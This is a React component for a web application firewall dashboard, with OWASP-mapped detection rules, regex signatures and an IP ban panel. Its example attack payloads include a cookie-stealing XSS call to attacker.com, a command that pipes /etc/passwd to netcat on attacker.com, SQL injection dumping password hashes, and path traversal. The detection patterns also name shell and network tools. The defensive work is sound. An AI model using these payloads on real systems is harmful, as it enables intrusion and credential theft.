import React, { useState, useEffect } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Sliders,
  Lock,
  Unlock,
  Plus,
  CheckCircle2,
  Globe,
  Volume2,
  Code2,
  Terminal,
  ChevronDown,
  ChevronUp,
  FileText,
  AlertTriangle,
  Cpu
} from 'lucide-react';
import { db, collection, onSnapshot, doc, setDoc } from '../firebase.ts';

interface DetailedFirewallRule {
  id: string;
  name: string;
  category: string;
  owaspId: string;
  cwe: string;
  owaspTop10: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  anomalyPoints: number;
  enabled: boolean;
  targetFields: string[];
  regexPattern: string;
  exampleAttackPayload: string;
  remediationAction: string;
  description: string;
}

interface BannedIpItem {
  ip: string;
  strikes: number;
  reason: string;
  bannedAt: string;
  expiresAt?: string;
}

interface FirewallRulesViewProps {
  onVoiceDebrief?: (text: string) => void;
  onRefreshData?: () => void;
}

const DETAILED_RULES: DetailedFirewallRule[] = [
  {
    id: 'sqli_guard',
    name: 'SQL Injection (SQLi) Defense Engine',
    category: 'Database Security',
    owaspId: 'OWASP-942100',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    owaspTop10: 'A03:2021 - Injection',
    severity: 'CRITICAL',
    anomalyPoints: 5,
    enabled: true,
    targetFields: ['ARGS_GET', 'ARGS_POST', 'REQUEST_COOKIES', 'REQUEST_BODY'],
    regexPattern: '(?i)(\\b(select|union|insert|update|delete|drop|alter|truncate|exec)\\b.*(from|into|table|database)|/\\*!\\d+.*\\*/|\' OR \'1\'=\'1|benchmark\\(\\d+,|sleep\\(\\d+\\))',
    exampleAttackPayload: "' UNION SELECT username, password_hash FROM users WHERE '1'='1",
    remediationAction: '403 FORBIDDEN - Intercept payload, issue 5-point anomaly strike, log forensic payload.',
    description: 'Detects UNION SELECT, OR 1=1, DROP TABLE, and blind time-based SQL injection payloads across all request parameters.'
  },
  {
    id: 'xss_shield',
    name: 'Cross-Site Scripting (XSS) Filter',
    category: 'Application Security',
    owaspId: 'OWASP-941100',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    owaspTop10: 'A03:2021 - Injection',
    severity: 'CRITICAL',
    anomalyPoints: 5,
    enabled: true,
    targetFields: ['ARGS_GET', 'ARGS_POST', 'REQUEST_HEADERS', 'REQUEST_BODY'],
    regexPattern: '(?i)(<script[^>]*>|javascript:|onerror\\s*=|onload\\s*=|document\\.cookie|<iframe[^>]*>|eval\\(|String\\.fromCharCode)',
    exampleAttackPayload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
    remediationAction: '403 FORBIDDEN - Intercept DOM payload, scrub reflections, drop connection.',
    description: 'Inspects requests for script tags, onerror handlers, javascript: URIs, and malicious DOM payload reflection.'
  },
  {
    id: 'path_traversal',
    name: 'Path Traversal & LFI Guard',
    category: 'System Security',
    owaspId: 'OWASP-930100',
    cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    owaspTop10: 'A01:2021 - Broken Access Control',
    severity: 'CRITICAL',
    anomalyPoints: 5,
    enabled: true,
    targetFields: ['REQUEST_URI', 'ARGS_GET', 'ARGS_POST'],
    regexPattern: '(\\.\\./|\\.\\.\\\\|/etc/passwd|/etc/shadow|/proc/self/environ|c:\\\\windows\\\\system32|file://|php://filter)',
    exampleAttackPayload: 'GET /api/v1/download?file=../../../../etc/passwd',
    remediationAction: '403 FORBIDDEN - Intercept directory escape attempt, restrict file system accessor.',
    description: 'Blocks ../ directory escape, /etc/passwd, boot.ini, and arbitrary local file inclusion (LFI) attempts.'
  },
  {
    id: 'rce_shield',
    name: 'Remote Code Execution (RCE) Shield',
    category: 'System Security',
    owaspId: 'OWASP-932100',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
    owaspTop10: 'A03:2021 - Injection',
    severity: 'CRITICAL',
    anomalyPoints: 5,
    enabled: true,
    targetFields: ['ARGS_GET', 'ARGS_POST', 'REQUEST_HEADERS', 'REQUEST_BODY'],
    regexPattern: '(;|\\n|\\|\\||&&|\\$\\(|`)\\s*(cat|ls|whoami|nc|curl|wget|bash|sh|python|perl|powershell)\\b',
    exampleAttackPayload: 'POST /api/v1/export; cat /etc/passwd | nc attacker.com 4444',
    remediationAction: '403 FORBIDDEN - Intercept OS command chain, block subshell execution.',
    description: 'Intercepts bash command chaining (;, |, &&, `), eval(), and system process execution vectors.'
  },
  {
    id: 'bot_shield',
    name: 'Automated Bot & Scraper Detector',
    category: 'Bot Defense',
    owaspId: 'BOT-800100',
    cwe: 'CWE-799: Improper Control of Interaction Frequency',
    owaspTop10: 'A07:2021 - Identification & Authentication Failures',
    severity: 'HIGH',
    anomalyPoints: 3,
    enabled: true,
    targetFields: ['HTTP_USER_AGENT', 'REQUEST_HEADERS'],
    regexPattern: '(?i)(python-requests|headlesschrome|phantomjs|selenium|zgrab|gobuster|dirbuster|nikto|sqlmap)',
    exampleAttackPayload: 'User-Agent: python-requests/2.28.1 (Automated Scraping Bot)',
    remediationAction: '403 FORBIDDEN - Block automated crawler signatures and headless scrapers.',
    description: 'Identifies headless browser signatures, python-requests, curl automated sweeps, and credential stuffing tools.'
  },
  {
    id: 'contract_guard',
    name: 'OpenAPI Schema Contract Enforcer',
    category: 'API Security',
    owaspId: 'CONTRACT-700100',
    cwe: 'CWE-20: Improper Input Validation',
    owaspTop10: 'A08:2021 - Software and Data Integrity Failures',
    severity: 'HIGH',
    anomalyPoints: 4,
    enabled: true,
    targetFields: ['REQUEST_BODY', 'CONTENT_TYPE', 'JSON_SCHEMA'],
    regexPattern: 'JSON_SCHEMA_VALIDATOR: { additionalProperties: false, required: [...], typeCheck: true }',
    exampleAttackPayload: 'POST /api/v1/users {"email":"test@example.com", "isAdmin": true, "role": "superadmin"}',
    remediationAction: '422 UNPROCESSABLE ENTITY / 403 - Reject unexpected JSON schema attributes.',
    description: 'Enforces strict JSON schema validation, parameter types, max payload sizes, and unexpected body fields.'
  },
  {
    id: 'ratelimit_engine',
    name: 'Sliding-Window Rate Limiter Engine',
    category: 'DDoS Defense',
    owaspId: 'RATELIMIT-600100',
    cwe: 'CWE-770: Allocation of Resources Without Limits or Throttling',
    owaspTop10: 'A04:2021 - Insecure Design',
    severity: 'MEDIUM',
    anomalyPoints: 2,
    enabled: true,
    targetFields: ['CLIENT_IP', 'HTTP_AUTHORIZATION'],
    regexPattern: 'TOKEN_BUCKET: capacity=100, refillRate=1.66req/sec, burstThreshold=20',
    exampleAttackPayload: 'Exceeded 100 requests in 60s window from single client IP',
    remediationAction: '429 TOO MANY REQUESTS - Enforce 60-second cooldown window.',
    description: 'Applies token bucket rate limits (100 req/min per IP) and issues HTTP 429 Too Many Requests response.'
  }
];

export const FirewallRulesView: React.FC<FirewallRulesViewProps> = ({
  onVoiceDebrief,
  onRefreshData
}) => {
  const [rules, setRules] = useState<DetailedFirewallRule[]>(DETAILED_RULES);
  const [expandedRuleId, setExpandedRuleId] = useState<string | null>('sqli_guard');
  const [bannedIps, setBannedIps] = useState<BannedIpItem[]>([]);
  const [newManualIp, setNewManualIp] = useState('');
  const [ipReason, setIpReason] = useState('Manual Security Operator Ban');
  const [actionSuccessMsg, setActionSuccessMsg] = useState<string | null>(null);

  // Sync Banned IPs from Firestore
  useEffect(() => {
    const unsubscribe = onSnapshot(collection(db, 'banned_ips'), (snapshot) => {
      const items: BannedIpItem[] = [];
      snapshot.forEach((docSnap) => {
        const data = docSnap.data();
        if (data && data.ip && !data.unbanned) {
          items.push(data as BannedIpItem);
        }
      });
      setBannedIps(items);
    }, (err) => {
      console.warn('Firestore banned_ips notice:', err);
    });

    return () => unsubscribe();
  }, []);

  const showToast = (msg: string) => {
    setActionSuccessMsg(msg);
    setTimeout(() => setActionSuccessMsg(null), 3000);
  };

  // Toggle Rule Status
  const handleToggleRule = (id: string) => {
    setRules((prev) =>
      prev.map((r) => {
        if (r.id === id) {
          const nextEnabled = !r.enabled;
          showToast(`${r.name} is now ${nextEnabled ? 'ACTIVE (BLOCKING)' : 'DISABLED'}`);
          return { ...r, enabled: nextEnabled };
        }
        return r;
      })
    );
  };

  // Expand / Collapse Rule
  const toggleExpand = (id: string) => {
    setExpandedRuleId(expandedRuleId === id ? null : id);
  };

  // Release Ban IP
  const handleReleaseBan = async (ipToRelease: string) => {
    try {
      await fetch('/_gk/api/unban', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ipToRelease })
      });
    } catch {}

    setBannedIps((prev) => prev.filter((item) => item.ip !== ipToRelease));
    try {
      await setDoc(doc(db, 'banned_ips', ipToRelease.replace(/\./g, '_')), {
        ip: ipToRelease,
        strikes: 0,
        unbanned: true,
        unbannedAt: new Date().toISOString()
      }, { merge: true });
    } catch {}

    showToast(`IP Address ${ipToRelease} released from perimeter firewall ban`);
    onRefreshData?.();
  };

  // Manual Ban Add
  const handleAddManualBan = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newManualIp.trim()) return;

    const ip = newManualIp.trim();
    const newRecord: BannedIpItem = {
      ip,
      strikes: 5,
      reason: ipReason || 'Manual Operator Block',
      bannedAt: new Date().toISOString()
    };

    setBannedIps((prev) => [newRecord, ...prev.filter((i) => i.ip !== ip)]);

    try {
      await setDoc(doc(db, 'banned_ips', ip.replace(/\./g, '_')), newRecord, { merge: true });
    } catch {}

    setNewManualIp('');
    showToast(`IP Address ${ip} has been BANNED at perimeter firewall`);
    onRefreshData?.();
  };

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Toast Notification */}
      {actionSuccessMsg && (
        <div className="fixed bottom-6 right-6 z-50 flex items-center gap-2 px-4 py-3 rounded-xl bg-emerald-950 border border-emerald-500/60 text-emerald-200 text-xs font-mono font-bold shadow-2xl animate-bounce">
          <CheckCircle2 className="h-4 w-4 text-emerald-400" />
          <span>{actionSuccessMsg}</span>
        </div>
      )}

      {/* Header Banner */}
      <div className="rounded-2xl border border-slate-800 bg-slate-900/80 p-6 backdrop-blur-md shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5 mb-1">
            <Sliders className="h-5 w-5 text-red-400" />
            <h1 className="text-xl font-black tracking-wide text-white uppercase font-mono">
              WAF Firewall Policy & Detailed Rule Specifications
            </h1>
          </div>
          <p className="text-xs text-slate-400 leading-relaxed max-w-2xl">
            Detailed OWASP CRS inspection specifications, regular expression detection patterns, CWE mappings, target request fields, and perimeter IP ban management.
          </p>
        </div>

        {/* Voice Debrief Button */}
        <button
          type="button"
          onClick={() =>
            onVoiceDebrief?.(
              `Firewall Policy Status Brief: ${rules.filter((r) => r.enabled).length} of ${
                rules.length
              } OWASP inspection rules are active with full regex signature matching. ${
                bannedIps.length
              } IP addresses are blocked at the perimeter.`
            )
          }
          className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-950/80 border border-red-500/40 hover:border-red-400 text-red-300 hover:text-white text-xs font-mono font-bold shadow-md transition-all cursor-pointer shrink-0"
        >
          <Volume2 className="h-4 w-4 text-red-400" />
          <span>Policy Voice Brief</span>
        </button>
      </div>

      {/* Main Grid: Detailed OWASP Rules List (Left 2 Cols) & Banned IPs Panel (Right 1 Col) */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column: Detailed Rules List */}
        <div className="lg:col-span-2 space-y-4">
          <div className="flex items-center justify-between pb-2 border-b border-slate-800">
            <h2 className="text-sm font-bold font-mono uppercase tracking-wider text-white flex items-center gap-2">
              <Shield className="h-4 w-4 text-red-400" />
              <span>OWASP Inspection Specifications ({rules.length} Modules)</span>
            </h2>
            <span className="text-xs font-mono text-slate-400">
              {rules.filter((r) => r.enabled).length} Active Enforcers
            </span>
          </div>

          <div className="space-y-3">
            {rules.map((rule) => {
              const isExpanded = expandedRuleId === rule.id;

              return (
                <div
                  key={rule.id}
                  className={`rounded-xl border transition-all overflow-hidden ${
                    rule.enabled
                      ? 'bg-slate-900/80 border-slate-800 hover:border-slate-700'
                      : 'bg-slate-950/40 border-slate-900 opacity-60'
                  }`}
                >
                  {/* Card Main Header */}
                  <div className="p-4 flex items-start justify-between gap-4">
                    <div className="flex-1 cursor-pointer" onClick={() => toggleExpand(rule.id)}>
                      <div className="flex flex-wrap items-center gap-2 mb-1.5">
                        <span className="text-sm font-bold text-white font-mono">
                          {rule.name}
                        </span>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-slate-950 border border-slate-800 text-slate-300">
                          {rule.owaspId}
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${
                            rule.severity === 'CRITICAL'
                              ? 'bg-red-950/80 border-red-800 text-red-300'
                              : rule.severity === 'HIGH'
                              ? 'bg-amber-950/80 border-amber-800 text-amber-300'
                              : 'bg-slate-950 border-slate-800 text-slate-300'
                          }`}
                        >
                          {rule.severity}
                        </span>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-red-950/60 border border-red-900/60 text-red-300">
                          +{rule.anomalyPoints} Anomaly Pts
                        </span>
                      </div>

                      <p className="text-xs text-slate-400 leading-relaxed">
                        {rule.description}
                      </p>
                    </div>

                    <div className="flex items-center gap-3 shrink-0">
                      {/* Toggle Switch */}
                      <button
                        type="button"
                        onClick={() => handleToggleRule(rule.id)}
                        className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none ${
                          rule.enabled ? 'bg-red-600' : 'bg-slate-800'
                        }`}
                        title={rule.enabled ? 'Disable Rule' : 'Enable Rule'}
                      >
                        <span
                          className={`pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out ${
                            rule.enabled ? 'translate-x-5' : 'translate-x-0'
                          }`}
                        />
                      </button>

                      {/* Expand Details Trigger */}
                      <button
                        type="button"
                        onClick={() => toggleExpand(rule.id)}
                        className="p-1 rounded bg-slate-950 border border-slate-800 text-slate-400 hover:text-white transition-colors cursor-pointer"
                        title={isExpanded ? 'Collapse details' : 'View detailed spec & regex'}
                      >
                        {isExpanded ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                      </button>
                    </div>
                  </div>

                  {/* Expandable Technical Specification Drawer */}
                  {isExpanded && (
                    <div className="px-4 pb-4 pt-3 border-t border-slate-800/80 bg-slate-950/60 space-y-3 text-xs font-mono">
                      {/* Classification & Mappings */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px]">
                        <div>
                          <span className="text-slate-500 block mb-0.5">Common Weakness Enumeration (CWE)</span>
                          <span className="text-slate-200 font-semibold">{rule.cwe}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block mb-0.5">OWASP Top 10 Category</span>
                          <span className="text-slate-200 font-semibold">{rule.owaspTop10}</span>
                        </div>
                      </div>

                      {/* Target Request Fields */}
                      <div>
                        <span className="text-slate-500 block mb-1 text-[11px]">Inspected Request Parameters & Targets</span>
                        <div className="flex flex-wrap gap-1.5">
                          {rule.targetFields.map((field) => (
                            <span key={field} className="px-2 py-0.5 rounded text-[10px] bg-slate-900 border border-slate-800 text-red-300 font-bold">
                              {field}
                            </span>
                          ))}
                        </div>
                      </div>

                      {/* Regular Expression Detection Signature */}
                      <div>
                        <span className="text-slate-500 block mb-1 text-[11px] flex items-center gap-1">
                          <Code2 className="h-3 w-3 text-amber-400" />
                          <span>Detection Regex Signature Pattern</span>
                        </span>
                        <pre className="p-2.5 rounded-lg bg-black border border-slate-800 text-amber-300/90 text-[11px] overflow-x-auto whitespace-pre-wrap break-all select-all font-mono">
                          {rule.regexPattern}
                        </pre>
                      </div>

                      {/* Sample Attack Payload & Action */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] pt-1 border-t border-slate-800/60">
                        <div>
                          <span className="text-slate-500 block mb-0.5 flex items-center gap-1">
                            <Terminal className="h-3 w-3 text-red-400" />
                            <span>Example Attack Vector</span>
                          </span>
                          <code className="text-red-300 font-bold break-all">{rule.exampleAttackPayload}</code>
                        </div>
                        <div>
                          <span className="text-slate-500 block mb-0.5 flex items-center gap-1">
                            <ShieldAlert className="h-3 w-3 text-emerald-400" />
                            <span>Enforcement Response Action</span>
                          </span>
                          <span className="text-emerald-400 font-bold">{rule.remediationAction}</span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* Right Column: Banned IPs & Manual Ban Panel */}
        <div className="space-y-6">
          {/* Add Manual IP Ban Card */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/80 p-5 shadow-lg">
            <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-white mb-3 flex items-center gap-2">
              <Plus className="h-4 w-4 text-red-400" />
              <span>Add Manual IP Perimeter Ban</span>
            </h3>

            <form onSubmit={handleAddManualBan} className="space-y-3">
              <div>
                <label className="block text-[11px] font-mono text-slate-400 mb-1">
                  Target IP Address
                </label>
                <input
                  type="text"
                  required
                  value={newManualIp}
                  onChange={(e) => setNewManualIp(e.target.value)}
                  placeholder="198.51.100.42"
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-lg text-xs font-mono text-white placeholder-slate-600 focus:outline-none focus:border-red-500"
                />
              </div>

              <div>
                <label className="block text-[11px] font-mono text-slate-400 mb-1">
                  Enforcement Reason
                </label>
                <input
                  type="text"
                  value={ipReason}
                  onChange={(e) => setIpReason(e.target.value)}
                  placeholder="Manual SecOps Operator Ban"
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-lg text-xs font-mono text-white placeholder-slate-600 focus:outline-none focus:border-red-500"
                />
              </div>

              <button
                type="submit"
                className="w-full flex items-center justify-center gap-2 px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white font-mono font-bold text-xs shadow-md transition-all cursor-pointer"
              >
                <Lock className="h-3.5 w-3.5" />
                <span>Enforce Immediate IP Ban</span>
              </button>
            </form>
          </div>

          {/* Active Banned IPs Feed */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/80 p-5 shadow-lg space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-slate-800">
              <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-white flex items-center gap-2">
                <Globe className="h-4 w-4 text-red-400" />
                <span>Active Banned IPs ({bannedIps.length})</span>
              </h3>
              <span className="text-[10px] font-mono text-slate-400">Synced to Firestore</span>
            </div>

            <div className="space-y-2 max-h-[360px] overflow-y-auto pr-1">
              {bannedIps.length === 0 ? (
                <div className="py-8 text-center text-xs text-slate-500 font-mono">
                  No active IP bans enforced. Perimeter clean.
                </div>
              ) : (
                bannedIps.map((item) => (
                  <div
                    key={item.ip}
                    className="p-3 rounded-lg border border-red-950/60 bg-red-950/20 flex items-center justify-between gap-3 text-xs font-mono"
                  >
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-red-300">{item.ip}</span>
                        <span className="px-1.5 py-0.5 rounded text-[10px] bg-red-950 border border-red-800 text-red-400">
                          {item.strikes} Strikes
                        </span>
                      </div>
                      <span className="text-[11px] text-slate-400 truncate block mt-0.5">
                        {item.reason}
                      </span>
                    </div>

                    <button
                      type="button"
                      onClick={() => handleReleaseBan(item.ip)}
                      className="px-2.5 py-1 rounded bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 hover:text-white text-[11px] font-bold transition-all cursor-pointer flex items-center gap-1 shrink-0"
                      title="Release IP Ban"
                    >
                      <Unlock className="h-3 w-3 text-emerald-400" />
                      <span>Unban</span>
                    </button>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
